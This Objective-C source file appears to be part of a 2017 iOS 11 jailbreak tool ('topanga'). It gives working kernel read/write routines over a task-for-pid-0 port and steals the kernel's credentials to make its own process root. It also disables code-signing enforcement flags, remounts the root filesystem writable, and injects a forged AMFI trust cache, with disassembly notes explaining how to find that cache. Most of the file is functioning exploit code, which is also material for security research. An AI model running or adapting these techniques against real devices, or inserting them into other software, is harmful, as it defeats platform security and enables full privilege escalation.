//
//  jailbreak.m
//  topanga
//
//  Created by Abraham Masri @cheesecakeufo on 15/12/2017.
//  Copyright © 2017 Abraham Masri @cheesecakeufo. All rights reserved.
//

#include "jailbreak.h"
#include "libjb.h"
#include "kutils.h"
#include "kcall.h"
#include "symbols.h"
#include "kmem.h"
#include "patchfinder64_11.h"

#include <errno.h>
#include <dirent.h>

mach_port_t tfp0 = MACH_PORT_NULL;

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

size_t
kread(uint64_t where, void *p, size_t size)
{

    if(tfp0 == MACH_PORT_NULL) {
        printf("[ERROR]: tfp0's port is null!\n");
    }

    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);

        if (rv || sz == 0) {
            printf("[ERROR]: error reading buffer at @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

uint64_t
kread_uint64(uint64_t where)
{
    uint64_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

uint32_t
kread_uint32(uint64_t where)
{
    uint32_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{

    if(tfp0 == MACH_PORT_NULL) {
        printf("[ERROR]: tfp0's port is null!\n");
    }

    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            printf("[ERROR]: error copying buffer into region: @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

size_t
kwrite_uint64(uint64_t where, uint64_t value)
{
    return kwrite(where, &value, sizeof(value));
}

size_t
kwrite_uint32(uint64_t where, uint32_t value)
{
    return kwrite(where, &value, sizeof(value));
}

/*
 * Purpose: iterates over the procs and finds containermanagerd
 */
uint64_t get_containermanagerd_proc() {

    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        char comm[28];
        kread(bsd_info + 0x26a /* KSTRUCT_OFFSET_PROC_COMM */, comm, 28);
        
        // yeah, I know.. (might need to do bsd_info - something + comm_offset) instead
        if(strstr("ainermanager", comm)) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return -1; // we failed :/
}


/*
 * Purpose: iterates over the procs and finds our proc
 */
uint64_t get_proc_for_pid(pid_t target_pid) {
    
    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));

        // get the process pid
        uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        printf("[PID]: %d\n", pid);
        if(pid == target_pid) {
            return bsd_info;
        }

        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return -1; // we failed :/
}

/*
 * Purpose: iterates over the procs and finds a pid with given name
 */
pid_t get_pid_for_name(char *name) {
    
    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        char comm[MAXCOMLEN+1];
        kread(bsd_info + 0x268 /* KSTRUCT_OFFSET_PROC_COMM (is this iPhone X offset??) */, comm, 17);
        
        if(strstr(name, comm)) {
            // get the process pid
            uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
            
            return (pid_t)pid;
        }
        
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    return -1; // we failed :/
}


uint64_t our_proc = 0;
uint64_t our_cred = 0;

void set_uid0 () {
    
    kern_return_t ret = KERN_SUCCESS;
    
    if(our_proc == 0)
        our_proc = get_proc_for_pid(getpid());
    
    if(our_proc == -1) {
        printf("[ERROR]: no our proc. wut\n");
        ret = KERN_FAILURE;
        return;
    }
    
    extern uint64_t kernel_task;
    
    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    if(our_cred == 0)
        our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
    
    uint64_t offsetof_p_csflags = 0x2a8;
    
    uint32_t csflags = kread_uint32(our_proc + offsetof_p_csflags);
    kwrite_uint32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD));
    
    setuid(0);
    
}

void set_cred_back () {
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);
}

kern_return_t mount_rootfs() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    printf("kaslr_slide: %llx\n", kaslr_slide);
    printf("passing kernel_base: %llx\n", kernel_base);
    
    int rv = init_kernel(kernel_base, NULL);
    
    if(rv != 0) {
        printf("[ERROR]: could not initialize kernel\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    printf("[INFO]: sucessfully initialized kernel\n");
    
    uint64_t rootvnode = find_rootvnode();
    printf("_rootvnode: %llx (%llx)\n", rootvnode, rootvnode - kaslr_slide);
    
    if(rootvnode == 0) {
        ret = KERN_FAILURE;
        return ret;
    }
    
    uint64_t rootfs_vnode = kread_uint64(rootvnode);
    printf("rootfs_vnode: %llx\n", rootfs_vnode);
    uint64_t v_mount = kread_uint64(rootfs_vnode + 0xd8);
    printf("v_mount: %llx (%llx)\n", v_mount, v_mount - kaslr_slide);
    uint32_t v_flag = kread_uint32(v_mount + 0x71);
    printf("v_flag: %x (%llx)\n", v_flag, v_flag - kaslr_slide);
    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));

    set_uid0();
    printf("our uid: %d\n", getuid());
    char *nmz = strdup("/dev/disk0s1s1");
    rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
    
    if(rv == -1) {
        printf("[ERROR]: could not mount '/': %d\n", rv);
    } else {
        printf("[INFO]: successfully mounted '/'\n");
    }
    

    return ret;
}

kern_return_t unpack_bootstrap() {
    
    kern_return_t ret = KERN_SUCCESS;
    sleep(3);
    char path[4096];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    char *pt = realpath(path, NULL);
    
    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];

    NSString *bootstrap_path = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];

    set_uid0();
    
    if(([[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Cydia.app"]) == NO) {
        chdir("/");
        FILE *bootstrap = fopen([bootstrap_path UTF8String], "r");
        untar(bootstrap, "/");
        fclose(bootstrap);
    }
 
    chdir("/");
    FILE *bootstrap = fopen([[execpath stringByAppendingPathComponent:@"data.tar"] UTF8String], "r");
    untar(bootstrap, "/");
    fclose(bootstrap);
    
    printf("[INFO]: finished installing bootstrap and friends\n");
    
    uint64_t trust_chain = find_trustcache();
    uint64_t amficache = find_amficache();
    
    printf("trust_chain = 0x%llx\n", trust_chain);
    printf("amficache = 0x%llx\n", amficache);
    
    struct trust_mem mem;
    mem.next = kread_uint64(trust_chain);
    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
    
    copyfile([[execpath stringByAppendingPathComponent:@"Cydia"] UTF8String], "/Applications/Cydia.app/Cydia", 0, COPYFILE_ALL);
    chmod("/Applications/Cydia.app/Cydia", 0777);

//    copyfile([[execpath stringByAppendingPathComponent:@"xx.plist"] UTF8String], "/Applications/Cydia.app/Info.plist", 0, COPYFILE_ALL);
//    chmod("/Applications/Cydia.app/Info.plist", 0777);
    
    int rv = grab_hashes("/Applications/Cydia.app", kread, amficache, mem.next);
    printf("rv = %d, numhash = %d\n", rv, numhash);
    
    size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
    uint64_t kernel_trust = 0;
    
    kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
    mach_vm_allocate(tfp0, (mach_vm_address_t *)&kernel_trust, length, VM_FLAGS_ANYWHERE);;
    printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
    
    mem.count = numhash;
    kwrite(kernel_trust, &mem, sizeof(mem));
    kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
    kwrite_uint64(trust_chain, kernel_trust);
    
    free(allhash);
    free(allkern);
    free(amfitab);
    
    return ret;
}

/*
 
trust cache (iOS 10.x/iPad Air):
 
(0): search for string 'amfi_prevent_old_entitled_platform'
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CD8 loc_FFFFFFF0064F8CD8                    ; CODE XREF: sub_FFFFFFF0064F8ADC+1D8↑j
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CD8                 ADRP            X0, #aAmfiPreventOld@PAGE ; "amfi_prevent_old_entitled_platform_bina"...
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CDC (1)             ADD             X0, X0, #aAmfiPreventOld@PAGEOFF ; "amfi_prevent_old_entitled_platform_bina"...
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CE0                 MOV             W2, #4
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CE4                 ADD             X1, SP, #0x50+var_34
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CE8                 BL              sub_FFFFFFF0064FAA60
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CEC (2)             CBZ             W0, loc_FFFFFFF0064F8D00 (3)
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CF0                 LDR             W8, [SP,#0x50+var_34]
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CF4                 CBZ             W8, loc_FFFFFFF0064F8D00
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CF8                 MOV             W8, #1
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8CFC                 STRB            W8

com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8D00 loc_FFFFFFF0064F8D00 (3)                    ; CODE XREF: sub_FFFFFFF0064F8ADC+A0↑j
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8D00                                 ; sub_FFFFFFF0064F8ADC+210↑j ...
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8D00                 BL              sub_FFFFFFF0064F6508 (4)
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F8D04                 BL              sub_FFFFFFF0064FAA00

com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508 sub_FFFFFFF0064F6508 (4)                  ; CODE XREF: sub_FFFFFFF0064F8ADC:loc_FFFFFFF0064F8D00↓p
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508 var_s0          =  0
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508                 STP             X29, X30, [SP,#-0x10+var_s0]!
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F650C                 MOV             X29, SP
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6510                 ADRP            X8, #qword_FFFFFFF00761B328@PAGE (5) the address of the QWORD is trust cache
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6514                 STR             XZR, [X8,#qword_FFFFFFF00761B328@PAGEOFF]
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6518                 BL              sub_FFFFFFF0064FAA00
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F651C                 ADRP            X8, #qword_FFFFFFF00761B320@PAGE
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6520                 STR             X0, [X8,#qword_FFFFFFF00761B320@PAGEOFF]
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6524                 LDP             X29, X30, [SP+var_s0],#0x10
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6528                 RET
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6528 ; End of function sub_FFFFFFF0064F6508
 
 
 
trust cache (iOS 11.x / iPhone X):
 
(0): com.apple.driver.AppleMobileFileIntegrity:__bss there will be a list of qwords
(1): check the ref(s) to each one (choose the first ref ADRP)
(2): if the func is like this then and your QWORD is the first one in the func then it's the correct one!

com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508 sub_FFFFFFF0064F6508                    ; CODE XREF: sub_FFFFFFF0064F8ADC:loc_FFFFFFF0064F8D00↓p
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508 var_s0          =  0
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6508                 STP             X29, X30, [SP,#-0x10+var_s0]!
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F650C                 MOV             X29, SP
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6510                 ADRP            X8, #qword_FFFFFFF00761B328@PAGE <-----
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6514                 STR             XZR, [X8,#qword_FFFFFFF00761B328@PAGEOFF]
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6518                 BL              sub_FFFFFFF0064FAA00
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F651C                 ADRP            X8, #qword_FFFFFFF00761B320@PAGE
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6520                 STR             X0, [X8,#qword_FFFFFFF00761B320@PAGEOFF]
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6524                 LDP             X29, X30, [SP+var_s0],#0x10
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6528                 RET
com.apple.driver.AppleMobileFileIntegrity:__text:FFFFFFF0064F6528 ; End of function sub_FFFFFFF0064F6508
 
 */


kern_return_t go_kppless() {
    int rv;

    kern_return_t ret = KERN_SUCCESS;
    
    char path[4096];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    char *pt = realpath(path, NULL);
    
    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
    
    
    NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.dmg"];
    const char *jl;

    
    
    uint64_t containermanagerd_proc = get_containermanagerd_proc();
    
    if(containermanagerd_proc == -1) {
        printf("[ERROR]: no containermanagerd. wut\n");
        ret = KERN_FAILURE;
        return ret;
    }
    

    printf("[INFO]: got containermanagerd's proc: %llx\n", containermanagerd_proc);
    
    // fix containermanagerd
    uint64_t contaienrmanagerd_cred = kread_uint64(containermanagerd_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    printf("[INFO]: got containermanagerd's ucred: %llx\n", contaienrmanagerd_cred);

    sleep(1);
    
    uint64_t our_proc = get_proc_for_pid(getpid());
    
    if(our_proc == -1) {
        printf("[ERROR]: no our proc. wut\n");
        ret = KERN_FAILURE;
        return ret;
    }

    printf("kaslr_slide: %llx\n", kaslr_slide);
    printf("passing kernel_base: %llx\n", kernel_base);

    rv = init_kernel(kernel_base, NULL);
    
    if(rv != 0) {
        printf("[ERROR]: could not initialize kernel\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    uint64_t trust_chain = find_trustcache();
    uint64_t amficache = find_amficache();

    if(trust_chain == 0) {
        trust_chain = 0xFFFFFFF0076DF428 + kaslr_slide;
    }

    printf("[INFO]: trust_chain: %llx\n", trust_chain);
    printf("[INFO]: amficache: %llx\n", amficache);
    
    term_kernel();
    set_uid0();

    /* 2. extract and run hdik */
    jl = "/tmp/hdik";
    long dmg = HFSOpen("/usr/standalone/update/ramdisk/arm64SURamDisk.dmg", 27);
    if (dmg >= 0) {
        long len = HFSReadFile(dmg, "/usr/sbin/hdik", gLoadAddr, 0, 0);
        printf("hdik = %ld\n", len);
        if (len > 0) {
            int fd = creat(jl, 0755);
            if (fd >= 0) {
                write(fd, gLoadAddr, len);
                close(fd);
            }
        }
        HFSClose(dmg);
    }
    
    uint32_t csflags = kread_uint32(our_proc + 0x2a8 /* csflags */);
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
    kwrite_uint32(our_proc  + 0x2a8 /* csflags */, csflags);
    printf("empowered US\n");

    printf("jl BOOTSTRAP: %s %s\n", jl, [bootstrap UTF8String]);
    pid_t pd;
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, [bootstrap UTF8String], "-nomount", NULL }, NULL);
    printf("[INFO]: PID: %d\n", pd);
    
    {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            uint64_t proc = kread_uint64(0xFFFFFFF007673D68 + kaslr_slide);
            while (proc) {
                uint32_t pid = kread_uint32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
                if (pid == pd) {
                    uint32_t csflags = kread_uint32(proc + 0x2a8 /* csflags */);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
                    kwrite_uint32(proc  + 0x2a8 /* csflags */, csflags);
                    printf("empower\n");
                    tries = 0;
                    break;
                }
                proc = kread_uint64(proc);
            }
        }
    }

    waitpid(pd, NULL, 0);
    {kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);return 0;}
    sleep(5);

    char thedisk[11];
    strcpy(thedisk, "/dev/diskN");
    for (int i = 9; i > 2; i--) {
        struct stat st;
        thedisk[9] = i + '0';
        rv = stat(thedisk, &st);
        if (rv == 0) {
            break;
        }
    }

    printf("thedisk: %s\n", thedisk);
    
//    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);

//    char * original_dir_path = "/usr/standalone/update/ramdisk/";
//
//    DIR *mydir;
//    struct dirent *myfile;
//
//    int fd = open(original_dir_path, O_RDONLY, 0);
//
//    mydir = fdopendir(fd);
//    while((myfile = readdir(mydir)) != NULL) {
//
//        if(strcmp(myfile->d_name, ".") == 0 || strcmp(myfile->d_name, "..") == 0)
//            continue;
//
//        printf("[CPBBB]: %s\n", myfile->d_name);
//    }
    
    /* 3. mount */
    memset(&args, 0, sizeof(args));
    args.fspec = thedisk;
    args.hfs_mask = 0777;
    //args.hfs_encoding = -1;
    //args.flags = HFSFSMNT_EXTENDED_ARGS;
    //struct timeval tv = { 0, 0 };
    //gettimeofday((struct timeval *)&tv, &args.hfs_timezone);
    
    rv = mount("hfs", "/Developer", MNT_RDONLY, &args);
    printf("mount: %d - uid: %d\n", rv, getuid());
    printf("errno: %d\n", errno);
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);
    
    /* 4. inject trust cache */

    printf("trust_chain = 0x%llx\n", trust_chain);

    struct trust_mem mem;
    mem.next = kread_uint64(trust_chain);
    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;

//#ifdef WANT_CYDIA
//    rv = grab_hashes("/", kread, amficache, mem.next);
//#else
//    rv = grab_hashes("/Developer", kread, amficache, mem.next);
//#endif
//    printf("rv = %d, numhash = %d\n", rv, numhash);
//
//    size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
//    uint64_t kernel_trust = 0;
//    mach_vm_allocate(tfp0, (mach_vm_address_t *)&kernel_trust, length, VM_FLAGS_ANYWHERE);
//    printf("[INFO]: alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
//
//    mem.count = numhash;
//    kwrite(kernel_trust, &mem, sizeof(mem));
//    kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
//    kwrite_uint64(trust_chain, kernel_trust);
//
//    free(allhash);
//    free(allkern);
//    free(amfitab);
//
//    /* 5. load daemons */
//
//#ifdef WANT_CYDIA
//    // FIXME
//    rv = posix_spawn(&pd, pt, NULL, NULL, (char **)&(const char*[]){ pt, "derp", "/Library/LaunchDaemons", NULL }, NULL);
//#else
//    rv = posix_spawn(&pd, pt, NULL, NULL, (char **)&(const char*[]){ pt, "derp", "/Developer/Library/LaunchDaemons/com.openssh.sshd.plist", NULL }, NULL);
//#endif
//
//    int tries = 3;
//    while (tries-- > 0) {
//        sleep(1);
//        uint64_t proc = kread_uint64(allproc);
//        while (proc) {
//            uint32_t pid = kread_uint32(proc + offsetof_p_pid);
//            if (pid == pd) {
//                uint32_t csflags = kread_uint32(proc + offsetof_p_csflags);
//                csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
//                kwrite_uint32(proc + offsetof_p_csflags, csflags);
//                printf("empower\n");
//                tries = 0;
//                break;
//            }
//            proc = kread_uint64(proc);
//        }
//    }
//
//    waitpid(pd, NULL, 0);
//
//    if (proc) {
//        kwrite_uint64(proc + offsetof_p_ucred, c_cred);
//    }
//
//    printf("done\n");
//
//    FILE *f = fopen("/tmp/k", "wt");
//    fprintf(f, "0x%llx 0x%llx\n0x%llx 0x%llx\n", kernel_base, kaslr_shift, trust_chain, amficache);
//    fclose(f);
    return 0;
}
